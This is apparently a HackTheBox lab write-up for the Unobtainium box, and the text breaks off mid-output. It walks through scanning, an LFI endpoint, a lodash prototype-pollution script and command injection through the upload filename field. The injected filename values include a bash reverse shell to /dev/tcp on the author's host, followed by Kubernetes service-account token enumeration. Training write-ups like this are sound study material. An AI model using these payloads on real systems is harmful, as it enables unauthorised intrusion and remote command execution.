---
title: "Unobtainium Hackthebox Writeup"
last_modified_at: 2021-08-29T11:40:02-05:00
categories:
  - htb
author_profile: false
tags:
  - htb
  - Linux
  - wireshark
  - nmap
  - kubernates
  - unobtainium
  - prototype pollution
  - Command Injection
  - secrets
  - unobtainium
  - javascript
  - ffuf
  - lfi
  - app.asar reversing
  - wireshark
  - google-cloudstorage-commands command injection
  - privilege escalation
  - docker
  - malicious pod privesc
---

<img alt="unobtainium" src="/assets/images/htb-boxes/unobtainium/unobtainium.png" width="200px" height="150px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!"  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[Unobtainium](https://www.hackthebox.eu/home/machines/profile/338) is a hard rated Linux box on HackTheBox by [felamos](https://www.hackthebox.eu/home/users/profile/27390). We start off by downloading an chat application in which one of the endpoint was vulnerable to LFI from which index.js file was downloaded. Publicly available exploit on two of the javascript module was chained to get a shell on a docker container which was a part of a Kubernates cluster. One of the pod has privilege to read all the secrets which was used to read c-admin-token and used to create a malicious pod with host filesystem mounted.

# Nmap
## Full Port Scan
```console
root@kali:~/Desktop/htb/boxes/unobtainium# nmap -v -p- --min-rate 1000 -oN nmap/all-ports unobtainium.htb
Nmap scan report for 10.10.10.235
Host is up (0.10s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  Elite

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun 12 14:59:37 2021 -- 1 IP address (1 host up) scanned in 74.50 seconds
```
We have a lot of ports open.
## Detail Scan
```console
# Nmap 7.80 scan initiated Wed May  5 21:27:08 2021 as: nmap -v -oN nmap/initial -sC -sV 10.10.10.235
Nmap scan report for 10.10.10.235
Host is up (0.097s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 15:42:24 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 15:42:23 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 15:42:23 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-04T05:00:56
| Not valid after:  2022-05-05T05:00:56
| MD5:   0aef 7678 7a4d 4da7 35fe 4a56 c2bd 6dfd
|_SHA-1: 9f60 fc68 85ad 9f21 3cd2 729d 4304 187a 81ce fe40
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
31337/tcp open  http          Node.js Express framework
| http-methods: 
|   Supported Methods: GET HEAD PUT DELETE POST OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/5%Time=6092BCDF%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,1FF,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20n
SF:o-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Content-T
SF:ype-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x203082aa7f-
SF:e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20c4
SF:131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2005\x20May\x20202
SF:1\x2015:42:23\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Statu
SF:s\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"mess
SF:age\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get
SF:\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\
SF:":403}\n")%r(HTTPOptions,203,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Co
SF:ntrol:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x
SF:203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel
SF:-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2005\x2
SF:0May\x202021\x2015:42:23\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kin
SF:d\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failu
SF:re\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20ca
SF:nnot\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"detai
SF:ls\":{},\"code\":403}\n")%r(FourOhFourRequest,21A,"HTTP/1\.0\x20403\x20
SF:Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x2
SF:0application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kubernetes
SF:-Pf-Flowschema-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubern
SF:etes-Pf-Prioritylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nD
SF:ate:\x20Wed,\x2005\x20May\x202021\x2015:42:24\x20GMT\r\nContent-Length:
SF:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":
SF:{},\"status\":\"Failure\",\"message\":\"forbidden:\x20User\x20\\\"syste
SF:m:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\x20ports,/Trinity
SF:\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\
SF:n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May  5 21:28:59 2021 -- 1 IP address (1 host up) scanned in 111.26 seconds
```
SSH is running on Port 22, HTTP services are running on Port 80 as well as port 31337(Node JS framework) and few other ports which according to nmap are related to kubernates.
So, let us start our enumeration with port 80.
# Port 80
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210505213220.png)
The home page is for a chat application developed by Unobtainium and we can download the app for in deb, rpm and snap format. So let us download the application in all of the format.

## Downloads
```console
reddevil@ubuntu:~/Documents/htb/boxes/unobtainium/http$ ls -la
total 170464
drwxrwxr-x 2 reddevil reddevil     4096 May  5 21:41 .
drwxrwxr-x 5 reddevil reddevil     4096 May  5 21:39 ..
-rw-r--r-- 1 reddevil reddevil 54849036 Jan 19 12:01 unobtainium_1.0.0_amd64.deb
-rw-r--r-- 1 reddevil reddevil 65490944 Jan 19 12:00 unobtainium_1.0.0_amd64.snap
-rw-r--r-- 1 reddevil reddevil 54199040 Jan 19 12:04 unobtainium-1.0.0.x86_64.rpm

```
Before diving into the application, let us use ffuf to bruteforce the hidden the files and directories and I did not find that much extra information.

## FUZZ
```console
reddevil@ubuntu:~/Documents/htb/boxes/unobtainium$ ffuf -u http://10.10.10.235/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt | tee ffuf/root.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.235/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 1988, Words: 96, Lines: 51]
downloads               [Status: 301, Size: 316, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
README.txt              [Status: 200, Size: 711, Words: 78, Lines: 29]
LICENSE.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64]
```


# Port 8443
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210829141945.png)
Since this is a self signed certificate, let us view the certificate if we find any additional information like hostname or email.

## SSL Certificate
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210505214503.png)

There are quite a few alternatives name and IP addresses for which the certificate is valid and looking at the DNS name, we can say for sure that this webserver is related to kubernates.

After accepting the risk and looking at the response, we dont have an access to view this page which means we need some sort of credentials to view this page and at the moment we do not have any.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210829142409.png)

So, I decided to go back to the applications I have downloaded earlier.

## Installing the .deb package
I did not have any prior experience of reversing and analyzing the deb package. So I decided to install the application on my box.

```console
root@kali:~/Desktop/htb/boxes/unobtainium/http# dpkg -i unobtainium_1.0.0_amd64.deb 
```

## Installation of ubobtainium
After installation, I noticed that it had created an directory inside `/opt`. 
```console
root@kali:/opt/unobtainium# ls
chrome_100_percent.pak  libEGL.so             libvulkan.so            resources          unobtainium
chrome_200_percent.pak  libffmpeg.so          LICENSE.electron.txt    resources.pak      v8_context_snapshot.bin
chrome-sandbox          libGLESv2.so          LICENSES.chromium.html  snapshot_blob.bin  vk_swiftshader_icd.json
icudtl.dat              libvk_swiftshader.so  locales                 swiftshader
```

## Content inside resources
As I was digging in, I found a file(`app.asar`) inside resources directory and a quick google search revealed that this app was created using electron.
```console
root@kali:/opt/unobtainium# ls -la resources
total 588
drwxrwxr-x 2 root root   4096 Jun 12 07:24 .
drwxrwxr-x 5 root root   4096 Jun 12 07:24 ..
-rw-rw-r-- 1 root root 592850 Jan 19 11:59 app.asar
```

## Reversing app.asar
Searching on internet, I found [an](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37) article on medium to reverse the elctron apps from **app.asar** file.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612074207.png)

```console
root@kali:/opt/unobtainium/resources# asar extract app.asar ~/Desktop/htb/boxes/unobtainium/source/
```
## Contents inside source dir
So, I have reversed the `app.asar` file and got javascript code.
```console
root@kali:~/Desktop/htb/boxes/unobtainium# ls -la source/
total 20
drwxrwxr-x 3 root root 4096 Jun 12 07:42 .
drwxrwxr-x 6 root root 4096 Jun 12 07:14 ..
-rw-r--r-- 1 root root  503 Jun 12 07:42 index.js
-rw-r--r-- 1 root root  207 Jun 12 07:42 package.json
drwxr-xr-x 4 root root 4096 Jun 12 07:42 src
```

## Dynamic Analysis
While I was looking at the ways to reverse the app.asar file, I also decided to run the installed application to find out what it did.
## Unobtainium chat application
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612072627.png)
It says Unable to reach to **unobtainium.htb** which means our box can not resolve the IP for **unobtainium.htb**, so let us add this hostname on our `/etc/hosts` file.

After adding the entry, I decided to check the functionality of all the entries of the left navbar.

## Post Message
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612072859.png)
It looks like we can send messages. So I decided to send a test message.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612072954.png)
Looks the message is sent. To dig a little deeper what is going on the background, I opened up **wireshark** and began to capture the traffic.
### On wireshark
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612073408.png)
- Credentials : felamos:Winter2021
- Payload :   
```json
{"auth":
	{
		"name":"felamos",
		"password":"Winter2021"
	},
	"message":
		{
			"text":"test"
		}
	}
```
On wireshark, we can see the actual request made the server and also the credentials for user **felamos**. So taking a note of that, let us continue to enumerate the application.

## TODO
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612072923.png)
Clicking on todo returns a bunch of todos.

### Capturing request on WireShark 
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612073655.png)
Looking at the request, we can find the following information.
- POST request is made to **/todo**.
-  payload used on the POST request
```json
{"auth":
	{
		"name":"felamos",
		"password":"Winter2021"
	},
	"filename":"todo.txt"
}
```
- Credentials are same as used before.

Looking at the request made to **/todo** endpoint, filename parameter looks interesting. It looks like the backend is taking the parameter and actually returing the content of that filename. If the content of the filename parameter is not properly sanitized, we can potentially read the content of the files from the remote server.

## Trying to read files
Looks like it is reading a file called todo.txt, let us check if this parameter is vulnerable to LFI.
### Trying to read /etc/passwd
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612080315.png)
Using Path traversing
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612080356.png)

I was unable to read the content of the file **/etc/passwd**. So, I thought there must be some type of sanitization of the user input. It looks like **/** and **../** are properly sanitized. If that is the case, we might only be able to view the content of the file which is on the same directory as **todo.txt**. Since this is and JS app, I took a guess hoping that the todo.txt is on the same directory as **index.js** and tried to read the content of **index.js.**

### Trying to read the content of index.js
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612080455.png)
And this time we got the file back.

## Content of index.js
```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");     
const bodyParser = require('body-parser');     
const _ = require('lodash');                                                                  
const app = express();
var fs = require('fs');
                                                                                              
const users = [                                                                               
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
];

let messages = [];                             
let lastId = 1;                                
                                                                                              
function findUser(auth) {                                                                     
  return users.find((u) =>                                                                    
    u.name === auth.name &&                                                                   
    u.password === auth.password);                                                            
}                                    
                                               
app.use(bodyParser.json());                                                                   
                                               
app.get('/', (req, res) => {                   
  res.send(messages);                                                                         
});                                                                                           
                                                                                              
app.put('/', (req, res) => {   
  const user = findUser(req.body.auth || {});                                                 
                                               
  if (!user) {                                 
    res.status(403).send({ok: false, error: 'Access denied'});                                
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
});
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
	const user = findUser(req.body.auth || {});
	if (!user) {
		res.status(403).send({ok: false, error: 'Access denied'});
		return;
	}

	filename = req.body.filename;
        testFolder = "/usr/src/app";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
});

app.listen(3000);
console.log('Listening on port 3000...');
"
```

After looking at the code for a while for a misconfiguration, I decided to check if any of the used modules are vulnerable and have a publicy available exploit and found that a version of **loadash** is vulnerable to prototype pollution, but the problem is we do not know the version of the loadash being used. Since this was a recent CVE, I decided to give it a try.

## Prototype pollution
Apart from the meaning of prototype pollution, I did not have a working knowledge on how to exploit the vulnerability.
So searching on internet I found an article on [portswigger](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications) which explains what protoype pollution is and how can we exploit this vulnerability.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612090750.png)

## Prototype pollution on loadash.merge
Also I found an amazing article on [synk](https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173732) explaining the vulnerability on loadsh.merge and the ways to exploit them.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612091031.png)
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612091107.png)
Looks like we can achieve admin privileges with the felamos user if we are able to pollute the prototype.

## How _.merge works
- Reference: [Geeksforgeeks](https://www.geeksforgeeks.org/lodash-_-merge-method/)
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612091307.png)

### Example
- Reference: [Geeksforgeeks](https://www.geeksforgeeks.org/lodash-_-merge-method/)
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612091355.png)


## Payload for prototype pollution
- Reference: [github](https://github.com/kimmobrunfeldt/lodash-merge-pollution-example)
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612105850.png)

## Writing python code
I decided to write a simple python script to imitate the PUT and POST requests that we have already seen on wireshark.
### put.py
```py
#!/usr/bin/python3
import requests
url = "http://unobtainium.htb:31337"

payload = {"__proto__":{ "canUpload": True,"canDelete":True }}


data ={"auth":{"name":"felamos","password":"Winter2021"},"message":payload} 
headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36",
        "Content-Type": "application/json"}
r = requests.put(url=url,json=data,headers=headers)
print(r.text)
```

### upload.py
```py
#!/usr/bin/python3
import requests
url = "http://unobtainium.htb:31337/upload"

#payload = {"messageId":1}


data ={"auth":{"name":"felamos","password":"Winter2021"},"filename":"upload.py"} 
headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36",
        "Content-Type": "application/json"}
r = requests.post(url=url,json=data,headers=headers)
print(r.text)
```

### Running upload.py
```console
root@kali:~/Desktop/htb/boxes/unobtainium/python# python3 upload.py 
{"ok":false,"error":"Access denied"}
```
We get an error saying the access is denied.

### Running put.py for polluting prototype and running upload.py
```console
root@kali:~/Desktop/htb/boxes/unobtainium/python# python3 put.py 
{"ok":true}
root@kali:~/Desktop/htb/boxes/unobtainium/python# python3 upload.py 
{"ok":true,"Uploaded_File":"upload.py"}
```
This time upload is successful which means we have successfully bypassed the check and uploaded a file. I played with this for a while but was out of ideas how to use this to get a shell on the box.


### Command injection on google-cloudstorage-commands
While checking for the publicly available exploits, I found  [an](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431) article which shows that **google-cloudstorage-commands** is vulnerable to command injection attack. Now we can chain the file uploading vulnerability with this command injection to get a shell on the box.
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210612113554.png)

## Uploading a file
Starting from basic, I decided to ping my box first.
```console
root@kali:~/Desktop/htb/boxes/unobtainium/python# python3 upload.py 
{'auth': {'name': 'felamos', 'password': 'Winter2021'}, 'filename': '& ping -c 1 10.10.14.23'}
{"ok":true,"Uploaded_File":"& ping -c 1 10.10.14.23"}
```

## Getting a ping back
And we get a response back from **unobtainium.htb** which means the command injection works.
```console
root@kali:~/Desktop/htb/boxes/unobtainium/python# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
11:37:36.140121 IP unobtainium.htb > kali: ICMP echo request, id 15, seq 1, length 64
11:37:36.140194 IP kali > unobtainium.htb: ICMP echo reply, id 15, seq 1, length 64
```

## Executing paylod for a reverse shell
```console
root@kali:~/Desktop/htb/boxes/unobtainium/python# python3 upload.py 
{'auth': {'name': 'felamos', 'password': 'Winter2021'}, 'filename': "& bash -c 'bash -i >& /dev/tcp/10.10.14.23/53 0>&1'"}
{"ok":true,"Uploaded_File":"& bash -c 'bash -i >& /dev/tcp/10.10.14.23/53 0>&1'"}
```

## Getting a shell back
```console
root@kali:~/Desktop/htb/boxes/unobtainium# nc -nvlp 53
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.10.235.
Ncat: Connection from 10.10.10.235:47534.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```
We are running as root inside a container.

## Reading user.txt
```console
root@webapp-deployment-5d764566f4-h5zhw:~# cat /root/user.txt 
594a46************6d10bd
```
# Privilege Escalalation
Since all the things point to kubernates, we must be inside a pod of a kubernates cluster. But I have no idea at the time I was solving the box. So, I first tried to enumerate the network that I was in to look for other docker containers.
## Additional docker containers
```console
root@webapp-deployment-5d764566f4-h5zhw:/opt/yarn-v1.22.5# for i in `seq 1 12`; do ping -c 1 172.17.0.$i; done | grep 64
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.033 ms
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.028 ms
64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 172.17.0.5: icmp_seq=1 ttl=64 time=0.010 ms
64 bytes from 172.17.0.6: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 172.17.0.7: icmp_seq=1 ttl=64 time=0.033 ms
64 bytes from 172.17.0.8: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 172.17.0.9: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 172.17.0.10: icmp_seq=1 ttl=64 time=0.025 ms
```
We get a response from 12 IPs and among them one must be a host and other 11 must be the docker containers. So I decided to upload a static nmap binary and scan for open ports on all of those containers.

## Nmap Scan
```console
root@webapp-deployment-5d764566f4-h5zhw:~# ./nmap -n   172.17.0.1-10 -p 3000   | grep open
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
3000/tcp open  unknown
3000/tcp open  unknown
3000/tcp open  unknown
3000/tcp open  unknown
3000/tcp open  unknown
3000/tcp open  unknown
```
- 172.17.0.3-6  and 172.17.0.9-10 has only port 3000 open which is running the node server.
- 172.17.0.7 has no ports open.
- 172.17.0.2 has port 5000 open.

## 172.17.0.8
```console
root@webapp-deployment-5d764566f4-h5zhw:~# ./nmap -n -v -p- 172.17.0.8  --min-rate 10000
Completed SYN Stealth Scan at 15:17, 7.12s elapsed (65535 total ports)
Nmap scan report for 172.17.0.8
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000023s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
8080/tcp open  http-alt
8181/tcp open  unknown
9153/tcp open  unknown
MAC Address: 02:42:AC:11:00:08 (Unknown)
```
# Kubernates Clusters
I had no ideas about Kubernates at the time so I read about them online, read couple of writeups from earlier challenges and watched an walkthrough for a tryhackme box which gave me a little idea what Kubernates is.
I found out that the secrets are mounted to each pod which contains credentials to make API calls.
## Checking if secrets are mounted on this container
```console
root@webapp-deployment-5d764566f4-h5zhw:~# mount | grep kube 
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
```

## Listing namespace
To contact to the API server, we need to use `kubectl` which was not present on the box. So, I downloaded the file on my local box and uploaded to the server.
```console
root@webapp-deployment-5d764566f4-h5zhw:/run/secrets/kubernetes.io/serviceaccount# kubectl get namespace --token=`cat token`
NAME              STATUS   AGE
default           Active   146d
dev               Active   145d
kube-node-lease   Active   146d
kube-public       Active   146d
kube-system       Active   146d
```
Except dev, all of the namespace listed are the default namespaces present on the kubernates.
## Listing Pods
We only have the permission to list the pod on the **dev** namespace. If we do not mention the namespace with `--namespace` flag, **default** namespace is selected by default.
```console
root@webapp-deployment-5d764566f4-h5zhw:/run/secrets/kubernetes.io/serviceaccount# kubectl get pods --token=`cat token` --namespace=dev        
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         145d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         145d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         145d
```
We have 3 pods running inside dev namespace.

## Getting privilege 
```console
root@webapp-deployment-5d764566f4-h5zhw:/run/secrets/kubernetes.io/serviceaccount# kubectl auth can-i --list -n dev --token=`cat token` 
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
It looks like we can do very little thing. Knowing very little at the time, I found create privilege on `selfsubjectaccessreviews.authorization.k8s.io` and  `selfsubjectrulesreviews.authorization.k8s.io` interesting and searched if that is exploitable, but I did not get anything.

## Can I exec Pods
```console
root@webapp-deployment-5d764566f4-h5zhw:/run/secrets/kubernetes.io/serviceaccount# /root/kubectl --token=`cat token` --namespace=dev auth can-i exec pods
no
```
Similar to docker, in kuberantes we can get a shell inside a docker container but it turns out we do not have that permission. If we can create a new pod, we can potentially mount the root filesystem of the host on the docker container and get a shell on that container to become root.
## Listing pods with -o wide flag
```console
root@webapp-deployment-5d764566f4-h5zhw:/tmp/py# kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` get pods -n dev -o wide
NAME                                READY   STATUS    RESTARTS   AGE    IP            NODE          NOMINATED NODE   READINESS GATES
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         146d   172.17.0.6    unobtainium   <none>           <none>
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         146d   172.17.0.9    unobtainium   <none>           <none>
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         146d   172.17.0.10   unobtainium   <none>           <none>
```
I was running out of ideas and I decided to get a shell on one of the other pods to check if they are just the exact replica or have some additional privileges.

# Getting shell on 172.17.0.10
I used the exact same process to get a shell on this pod by abusing prototype pollution and code injection.

This time the token was different and I checked if I have access to any other namespaces and it turned out I can.
## Listing privileges on kube-system
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
